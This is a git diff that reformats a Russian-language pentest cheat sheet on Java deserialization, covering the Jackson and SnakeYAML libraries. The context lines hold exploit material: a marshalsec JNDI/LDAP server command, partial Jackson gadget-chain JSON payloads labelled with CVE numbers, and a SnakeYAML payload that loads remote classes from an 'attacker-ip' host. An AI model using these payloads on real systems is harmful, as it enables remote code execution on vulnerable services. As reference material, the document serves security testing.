@@ -153,13 +153,13 @@ $ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#e
 Любой из следующих вариантов:
 
 ```Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object```
-* com.fasterxml.jackson.databind
-* org.codehaus.jackson.map
+  * com.fasterxml.jackson.databind
+  * org.codehaus.jackson.map
 
 
 * **Эксплуатация**
 
-CVE-2017-7525
+  * CVE-2017-7525
 ```json
 {
   "param": [
@@ -174,7 +174,7 @@ CVE-2017-7525
   ]
 }
 ```
-CVE-2017-17485
+  * CVE-2017-17485
 ```json
 {
   "param": [
@@ -183,7 +183,7 @@ CVE-2017-17485
   ]
 }
 ```
-CVE-2019-12384
+  * CVE-2019-12384
 ```json
 [
   "ch.qos.logback.core.db.DriverManagerConnectionSource", 
@@ -192,7 +192,7 @@ CVE-2019-12384
   }
 ]
 ```
-CVE-2020-36180
+  * CVE-2020-36180
 ```json
 [
   "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
@@ -217,7 +217,7 @@ CVE-2020-9548
 * [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)
 * [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)
 
-* **SnakeYAML**
+**SnakeYAML**
 
 > SnakeYAML — популярная библиотека на основе Java, используемая для анализа и вывода данных в формате YAML (YAML не является языком разметки). Она предоставляет простой в использовании API для работы с YAML — стандартом сериализации данных, понятным человеку, который обычно используется для файлов конфигурации и обмена данными.
 
@@ -226,5 +226,5 @@ CVE-2020-9548
 !!java.net.URLClassLoader [[
 !!java.net.URL ["http://attacker-ip/"]
 ]]
-```
 ]
+```
